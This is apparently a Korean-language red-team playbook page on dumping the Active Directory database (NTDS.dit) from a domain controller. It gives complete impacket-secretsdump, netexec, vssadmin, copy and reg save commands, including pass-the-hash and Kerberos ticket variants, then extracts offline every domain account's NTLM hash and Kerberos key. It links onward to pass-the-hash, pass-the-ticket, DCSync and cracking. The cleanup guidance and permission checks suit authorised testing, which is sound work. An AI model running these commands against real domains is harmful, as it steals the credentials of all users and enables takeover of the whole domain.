---
tags:
  - 환경/ad
  - 환경/windows
시작조건: ["도메인 컨트롤러 식별", "DC 관리자급 세션 또는 NTDS.dit·SYSTEM 파일 접근 확보"]
필요권한: ["DC 로컬 관리자, Domain Admin급 또는 Backup Operators 등 선택한 원격·VSS·파일 접근 방식에 필요한 권한"]
필요조건: ["명령 실행 위치에서 DC 관리 서비스 또는 기존 파일에 접근하는 경로", "NTDS.dit와 대응 SYSTEM hive를 함께 확보할 저장·회수 경로"]
결과: ["도메인 계정 NTLM hash와 Kerberos key", "존재할 때만 평문 비밀번호", "각 계정의 실제 인증 서비스와 권한을 별도로 검증해야 하는 hash·key"]
---

# NTDS.dit 덤프

## 한 줄 판단

도메인 컨트롤러의 관리자급 파일·VSS 접근으로 NTDS.dit와 대응 SYSTEM hive를 함께 확보하고, 분석 호스트에서 도메인 계정의 NTLM hash와 Kerberos key를 추출한다.

## 전제 조건

| 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
|---|---|---|---|
| 대상과 실행 위치 | 대상이 DC이고 원격 관리 또는 로컬 shell의 경로가 구분됨 | hostname, SMB domain, LDAP와 현재 네트워크 위치 | DC 역할, SMB/RPC 도달성 또는 로컬 shell 확인 |
| 현재 인증 수단 | 원격 방식이면 요청자 AD 계정의 비밀번호·NT hash·Kerberos ticket, 로컬 방식이면 현재 Windows token | `netexec`, `klist`, `whoami /all` | 도메인·계정명, 인증 형식과 상승 토큰 확인 |
| 높은 권한 | DC 파일·VSS 또는 원격 dump에 필요한 실제 권한 | `whoami /groups`, `netexec`와 선택한 방법의 접근 결과 | DC 로컬 관리자, Backup Operators, Domain Admin과 복제 권한을 구분 |
| NTDS와 SYSTEM 쌍 | 같은 DC·시점의 `NTDS.dit`와 SYSTEM hive를 읽거나 저장 가능 | `reg save`, 경로와 secretsdump 입력 확인 | SYSTEM hive 누락, 파일 ACL과 VSS snapshot 경로 확인 |

## 실행

> VSS·원격 서비스·DC database 접근은 서비스 상태와 민감한 인증 자료에 영향을 줄 수 있다. 같은 DC·시점의 NTDS/SYSTEM 쌍, shadow ID와 exact path를 기록하고 복구되지 않은 영향을 완료로 표현하지 않는다.

`<DC>`·`<DC_IP>`는 대상 DC, `<REQUESTER>`는 원격 요청자, NTDS·SYSTEM·shadow 경로는 DC 또는 분석 호스트 중 어느 쪽 기준인지 명시한다. 분석에 쓰는 파일은 같은 DC·시점의 쌍이어야 하며 요청자 인증 자료와 추출 계정 자료는 별개다.

1. 현재 권한이 단순 도메인 사용자, 로컬 관리자, Domain Admin 중 무엇인지 구분한다.
2. 원격 실행만 가능하면 DRSUAPI 기본 방식과 VSS 파일 추출 방식을 구분하고, 이 문서에서는 `-use-vss`를 선택한다.
3. 로컬 shell이 있으면 VSS/ntdsutil/파일 복사 방식으로 NTDS.dit와 SYSTEM hive를 확보한다.
4. 추출한 hash는 cracking, PtH, krbtgt 영향 판단으로 이어간다.

### Linux 공격 호스트에서 원격 덤프

#### 원격 방식부터 구분

| 원격 방식 | 실제 동작 | 필요한 권한 | 이 문서에서의 처리 |
|---|---|---|---|
| `secretsdump` 기본값 또는 NetExec의 DRSUAPI 방식 | DC 복제 API로 계정 secret 요청 | 요청자 SID의 디렉터리 복제 권한 | 파일 덤프가 아니므로 [[DCSync]] 사용 |
| `secretsdump -use-vss` | 원격 작업으로 VSS snapshot을 만들고 NTDS.dit·SYSTEM을 추출 | 대상 DC의 원격 관리자급 작업과 파일 접근 권한 | 이 문서의 원격 VSS 방식 |
| DC 관리자 shell의 `vssadmin`·`reg save` | DC에서 snapshot과 파일 사본 직접 생성 | 현재 DC 세션의 관리자급 토큰 또는 동등한 백업 권한 | 이 문서의 로컬 파일 확보 방식 |

다음 기존 명령은 기본적으로 DRSUAPI 경로가 될 수 있다. `Using the DRSUAPI method`가 표시되면 NTDS.dit 파일을 복사한 것이 아니라 DCSync를 수행한 것이므로 [[DCSync]]의 요청자·복제 권한 기준으로 판정한다.

```bash
impacket-secretsdump '<DOMAIN>/<REQUESTER>:<PASSWORD>@<DC>'
netexec smb <DC> -u <REQUESTER> -p '<PASSWORD>' --ntds
```

#### 원격 VSS 덤프의 요청자 인증 방식

세 방식은 DC에서 VSS 작업을 요청하는 `<REQUESTER>`의 인증 수단만 다르다. 어느 방식이든 `<REQUESTER>`가 대상 DC에서 원격 VSS·서비스·파일 작업을 수행할 실제 관리자급 권한을 가져야 한다.

| 보유한 요청자 인증 수단 | 사용할 방식 | 추가로 확인할 조건 |
|---|---|---|
| `<REQUESTER>`의 평문 비밀번호 | 비밀번호 인증 | 요청자 인증 성공과 DC 관리자급 원격 작업 권한 |
| `<REQUESTER>`의 NT hash | NTLM Pass-the-Hash | hash가 요청자 계정에 속하고 DC가 NTLM 인증을 허용 |
| `<REQUESTER>`의 유효한 TGT 또는 CIFS ticket이 담긴 ccache | Kerberos ticket 인증 | `KRB5CCNAME`, DC FQDN·realm·DNS·시간과 CIFS 접근 정상 |

##### 1. 요청자 평문 비밀번호 사용

```bash
impacket-secretsdump -use-vss '<DOMAIN>/<REQUESTER>:<PASSWORD>@<DC>'
```

##### 2. 요청자 NT hash 사용

```bash
impacket-secretsdump -use-vss -hashes :<NT_HASH> '<DOMAIN>/<REQUESTER>@<DC>'
```

`<NT_HASH>`는 덤프할 도메인 사용자 중 한 명의 hash가 아니라 원격 VSS 작업을 요청하는 `<REQUESTER>`의 NT hash다.

##### 3. 요청자 Kerberos ccache 사용

```bash
export KRB5CCNAME=<CCACHE_FILE>
klist
impacket-secretsdump -use-vss -k -no-pass -dc-ip <DC_IP> '<DOMAIN>/<REQUESTER>@<DC_FQDN>'
```

`-no-pass`는 익명 접근이 아니라 ccache의 `<REQUESTER>` ticket으로 인증하는 방식이다.

확인할 출력:

- VSS 또는 NTDSUTIL 방식의 snapshot·파일 처리 메시지와 이어지는 `Dumping Domain Credentials`, 도메인 사용자 NTLM hash.
- `Using the DRSUAPI method`가 보이면 `-use-vss`가 적용된 파일 추출이 아니라 [[DCSync]] 경로다.
- `STATUS_LOGON_FAILURE`는 요청자 비밀번호·NT hash·ticket과 계정 형식을 확인한다. `rpc_s_access_denied`·서비스 또는 snapshot 오류는 인증 성공과 DC 관리자급 원격 작업 권한을 분리해 확인한다.

### Windows 대상 DC에서 파일 확보

#### DC에서 파일 확보 흐름

`<NTDS_VOLUME>`는 DC에서 NTDS.dit가 있는 drive 문자(예: `C:`)이고, `<NTDS_COPY_PATH>`·`<SYSTEM_HIVE_PATH>`는 같은 DC에서 작업 전 없던 절대 임시 파일 경로다. `<NTDS_SHADOW_ID>`·`<NTDS_SHADOW_VOLUME>`는 바로 다음 `vssadmin create shadow` 출력의 ID·volume field에서 기록하며, `<NTDS_SHADOW_NTDS_PATH>`는 그 volume과 registry의 NTDS 경로를 결합한 DC 기준 경로다.

기본 `C:\Windows\NTDS\NTDS.dit`를 가정하지 말고 먼저 실제 database 경로와 그 volume을 확인한다. 실행 전 해당 volume의 shadow 목록을 기록하고, 임시 복사 경로가 없음을 확인한다.

```cmd
reg query "HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" /v "DSA Database File"
vssadmin list shadows /for=<NTDS_VOLUME>
if exist "<NTDS_COPY_PATH>" echo NTDS_COPY_EXISTS
if exist "<SYSTEM_HIVE_PATH>" echo SYSTEM_HIVE_EXISTS
vssadmin create shadow /for=<NTDS_VOLUME>
```

생성 출력의 `Shadow Copy ID`를 `<NTDS_SHADOW_ID>`, `Shadow Copy Volume Name`을 `<NTDS_SHADOW_VOLUME>`으로 기록한다. registry에서 확인한 NTDS 경로의 drive prefix를 `<NTDS_SHADOW_VOLUME>`으로 바꾼 exact 경로를 `<NTDS_SHADOW_NTDS_PATH>`로 사용한다. `HarddiskVolumeShadowCopy1` 같은 번호를 고정하지 않는다.

```cmd
copy "<NTDS_SHADOW_NTDS_PATH>" "<NTDS_COPY_PATH>"
reg save HKLM\SYSTEM "<SYSTEM_HIVE_PATH>"
dir "<NTDS_COPY_PATH>" "<SYSTEM_HIVE_PATH>"
```

확인할 출력:

- `ntds.dit`, `system.save` 확보.
- 두 파일은 함께 있어야 오프라인 복호화 입력이 된다. 이 시점은 hash 수집 전의 파일 확보 단계다.

### 이미 확보한 NTDS.dit와 SYSTEM hive 오프라인 분석

Hyper-V export, backup 또는 다른 파일 접근 경로에서 같은 DC·시점의 `NTDS.dit`와 `SYSTEM` hive를 이미 확보했다면 새로운 VSS·원격 service 작업을 만들지 않고 Linux 분석 호스트에서 기존 파일만 처리한다.

```bash
impacket-secretsdump -ntds '<NTDS_FILE>' -system '<SYSTEM_HIVE>' LOCAL
```

확인할 출력:

- `BootKey`, `Dumping Domain Credentials`와 계정별 NTLM hash·Kerberos key.
- `ntds.dit`와 SYSTEM hive의 host·시점이 다르거나 파일이 불완전하면 boot key·PEK 복호화 오류가 날 수 있다. 파일 존재만으로 credential 추출 성공을 기록하지 않는다.
- Hyper-V VHDX 자체, mounted volume과 export directory 정리는 [[Hyper-V VM 내보내기와 가상 디스크 오프라인 수집]]에서 수행하고, 이 명령의 별도 output file을 만들었다면 [[impacket-secretsdump]]의 산출물 기준으로 정리한다.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| `Dumping Domain Credentials`와 도메인 사용자 hash | NTDS 추출과 복호화 성공 | 도메인 계정 hash 확보 | 계정별 영향과 최소 후속 사용 범위 결정 |
| `krbtgt`, Domain Admin 또는 서비스 계정의 NTLM hash·Kerberos key | 핵심 도메인 계정의 hash·key 노출 | 도메인 전체 영향 가능 상태 | 계정 종류에 맞춰 [[Pass the Hash]], [[OverPass the Hash]], [[Pass the Ticket]] 가능성을 분리 |
| `ntds.dit`와 `system.save` 파일 생성 | 오프라인 추출 자료 확보 | NTDS 파일과 SYSTEM boot key 확보 | secretsdump로 실제 hash 출력 확인 |
| access denied | DC 파일/VSS 권한 부족 | NTDS 미획득 | Domain Admin, Backup Operators, 로컬 권한 구분 |
| 파일 잠김 | 사용 중인 NTDS 원본에 직접 접근 | 직접 복사 실패 | VSS snapshot 방식 사용 |
| 원격 dump 차단 | 방화벽, 방어 제품 또는 Remote Registry 영향 | 원격 추출 실패 | 이미 확보한 WinRM 세션에서 로컬 저장 후 회수 검토 |

## 확인할 출력과 권한

- `ntds.dit` 파일 확보만으로는 충분하지 않으며 대응하는 SYSTEM hive로 실제 hash가 출력되어야 한다.
- 일반 도메인 사용자, DC 로컬 관리자, Backup Operators, Domain Admin, 복제 권한을 구분한다.
- 이 기법의 성공은 광범위한 credential 노출 상태이며 현재 세션이 자동으로 Domain Admin이 된다는 뜻은 아니다.
- NTLM hash 또는 Kerberos key 출력, 평문 비밀번호 출력, Pass the Hash 인증 성공과 관리자 권한은 각각 다른 단계로 확인한다.

## 변경 영향과 복구

로컬 파일 확보 방식은 DC에 `<NTDS_SHADOW_ID>`와 `<NTDS_COPY_PATH>`·`<SYSTEM_HIVE_PATH>`를 만든다. 파일 회수와 무결성 확인을 마친 뒤 임시 파일을 먼저 제거하고, 이번 실행에서 기록한 shadow ID 하나만 삭제한다. `/oldest`나 `/all`은 기존 backup·restore point까지 지울 수 있으므로 사용하지 않는다.

```cmd
del /f "<NTDS_COPY_PATH>"
del /f "<SYSTEM_HIVE_PATH>"
if exist "<NTDS_COPY_PATH>" echo NTDS_COPY_REMAINS
if exist "<SYSTEM_HIVE_PATH>" echo SYSTEM_HIVE_REMAINS
vssadmin delete shadows /for=<NTDS_VOLUME> /shadow=<NTDS_SHADOW_ID>
vssadmin list shadows /shadow=<NTDS_SHADOW_ID>
```

두 `if exist` 명령이 아무것도 출력하지 않고 마지막 조회에서 해당 ID가 더 이상 나타나지 않아야 로컬 생성 자원 정리가 확인된다. `Snapshots were found, but they were outside of your allowed context`가 나오면 `vssadmin`으로 삭제 가능한 유형이 아니다. 이때 다른 shadow를 지우지 말고 생성에 사용한 provider·context와 `diskshadow` 관리 가능 여부를 확인하며, exact ID의 부재를 확인하기 전에는 복구 완료로 기록하지 않는다. 이미 회수·표시된 hash·key와 Windows 감사 흔적은 snapshot·파일 삭제로 되돌릴 수 없다.

- 원격 `secretsdump` 방식도 서비스 생성·원격 레지스트리 상태 변경 여부를 해당 도구 출력과 환경 정책에 따라 확인하고, 이번 실행에서 만든 임시 원격 리소스만 정리한다.

## 후속 공격 연결

- hash 사용: [[Pass the Hash]]
- ticket/key 사용: [[OverPass the Hash]], [[Pass the Ticket]]
- 특정 계정 복제: [[DCSync]]
- cracking: [[오프라인 해시 크래킹]]

## 관련 상태 라우터

- 획득한 도메인 hash의 서비스별 사용 가능성을 검증할 때: [[확보한 자격 증명으로 원격 접근 경로 선택]]
- hash가 속한 도메인 계정을 확인한 뒤 객체·그룹 권한을 열거할 때: [[AD Identity 확인 후 도메인 컨텍스트 열거]]

## 관련 도구

- [[impacket-secretsdump]]
- [[netexec]]
- [[evil-winrm]]
- [[powershell]]
- [[hashcat]]
- [[klist]]

## 참고 링크

- [Microsoft Defender for Endpoint: AD DS database path registry value](https://learn.microsoft.com/en-us/defender-endpoint/microsoft-defender-antivirus-exclusions-windows-server#active-directory-exclusions)
- [Microsoft Learn: Volume Shadow Copy Service tools](https://learn.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service)
- [Microsoft Learn: vssadmin list shadows](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/vssadmin-list-shadows)
- [Microsoft Learn: vssadmin delete shadows](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/vssadmin-delete-shadows)
- [Microsoft Learn: reg save](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/reg-save)
- [Fortra Impacket: secretsdump command](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)
